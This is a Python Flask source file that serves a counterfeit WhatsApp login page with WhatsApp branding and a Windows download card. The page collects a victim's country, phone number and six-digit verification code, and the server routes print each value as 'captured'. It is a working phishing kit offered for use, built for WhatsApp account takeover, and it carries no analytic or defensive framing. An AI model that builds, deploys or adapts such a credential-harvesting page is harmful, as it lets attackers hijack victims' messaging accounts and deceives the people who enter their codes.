from flask import Flask, render_template_string, request, jsonify
import time

app = Flask(__name__)

# Your original HTML (thoda modify kiya hai form handling ke liye)
HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WhatsApp Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:'Inter',sans-serif; }
body { background:#f7f5f2; min-height:100vh; }
.header { padding:18px 30px; }
.logo { color:#25D366; font-size:32px; font-weight:600; }
.container { width:min(95%,700px); margin:auto; }
.card { background:#fff; border:1px solid #222; border-radius:24px; padding:22px; margin-top:15px; }
.download { display:flex; justify-content:space-between; align-items:center; }
.download-left { display:flex; align-items:center; gap:15px; }
.icon { font-size:40px; }
.title { font-size:18px; }
.text { font-size:13px; color:#555; }
.btn { background:#25D366; color:#fff; border:none; padding:12px 28px; border-radius:999px; cursor:pointer; }
.login { text-align:center; padding:60px 30px; }
.login h1 { font-size:38px; font-weight:400; }
.sub { margin:10px 0 20px; color:#555; }
.field { width:240px; margin:10px auto; }
select, input { width:100%; height:50px; border:1px solid #222; border-radius:30px; padding:0 15px; outline:none; }
.next-btn { margin-top:20px; background:#25D366; color:#fff; border:none; padding:12px 25px; border-radius:999px; cursor:pointer; font-weight:600; }
.status { display:none; margin-top:10px; color:#444; }
.otp-box { display:none; }
.otp-container { display:flex; justify-content:center; gap:10px; margin-top:15px; }
.otp { width:55px; height:55px; text-align:center; font-size:20px; border:1px solid #222; border-radius:12px; outline:none; }
.footer { text-align:center; margin-top:20px; }
.footer a { color:#25D366; text-decoration:none; }
@media(max-width:768px){
    .login h1 { font-size:28px; }
    .field { width:100%; }
}
</style>
</head>
<body>

<div class="header">
    <div class="logo">WhatsApp</div>
</div>

<div class="container">
    <div class="card download">
        <div class="download-left">
            <div class="icon">💻</div>
            <div>
                <div class="title">Download WhatsApp for Windows</div>
                <div class="text">Voice & video calling support</div>
            </div>
        </div>
        <button class="btn">Download</button>
    </div>

    <div class="card login">
        <h1 id="title">Enter phone number</h1>
        <div class="sub" id="sub">Select country and enter number</div>

        <form id="step1" method="POST" action="/submit_phone">
            <div class="field">
                <select name="country">
                    <option> Pakistan (+92)</option>
                    <option> India (+91)</option>
                    <option> USA (+1)</option>
                </select>
            </div>
            <div class="field">
                <input name="phone" type="text" placeholder="+92" required>
            </div>
            <button type="submit" class="next-btn">Next</button>
        </form>

        <div class="status" id="status">Verifying your number...</div>

        <div id="step2" class="otp-box">
            <form id="otpForm" method="POST" action="/submit_otp">
                <div class="otp-container">
                    <input maxlength="1" class="otp" name="otp1" required>
                    <input maxlength="1" class="otp" name="otp2" required>
                    <input maxlength="1" class="otp" name="otp3" required>
                    <input maxlength="1" class="otp" name="otp4" required>
                    <input maxlength="1" class="otp" name="otp5" required>
                    <input maxlength="1" class="otp" name="otp6" required>
                </div>
                <input type="hidden" name="phone" id="hidden_phone">
                <button type="submit" class="next-btn">Verify</button>
            </form>
        </div>
    </div>

    <div class="footer">
        Don't have account? <a href="#">Get started</a>
    </div>
</div>

<script>
// Auto move OTP
const inputs = document.querySelectorAll(".otp");
inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        input.value = input.value.replace(/[^0-9]/g,'');
        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });
    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && input.value === "" && index > 0) {
            inputs[index - 1].focus();
        }
    });
});

// After phone submit, show OTP page
document.getElementById("step1").addEventListener("submit", function(e) {
    // Allow form to submit normally
});
</script>
</body>
</html>'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    phone = request.form.get('phone')
    country = request.form.get('country')
    
    print("\n" + "="*50)
    print("📱 PHONE NUMBER RECEIVED:")
    print(f"Country: {country}")
    print(f"Phone: {phone}")
    print("="*50 + "\n")
    
    # Show OTP page
    return render_template_string(HTML.replace('id="step1"', 'id="step1" style="display:none;"')
                                      .replace('id="step2"', 'id="step2" style="display:block;"')
                                      .replace('id="title">Enter phone number', f'id="title">Enter verification code')
                                      .replace('id="hidden_phone"', f'value="{phone}"'))

@app.route('/submit_otp', methods=['POST'])
def submit_otp():
    phone = request.form.get('phone')
    otp = ''.join([request.form.get(f'otp{i}') for i in range(1,7)])
    
    print("\n" + "="*50)
    print("🔐 OTP RECEIVED:")
    print(f"Phone: {phone}")
    print(f"OTP Code: {otp}")
    print("✅ Data captured successfully!")
    print("="*50 + "\n")
    
    return '''
          <img src="Capture.PNG" alt="">

    '''

if __name__ == '__main__':
    print("🚀 WhatsApp Login Page Starting...")
    print("Open this link in browser: http://127.0.0.1:5000")
    app.run(debug=True)
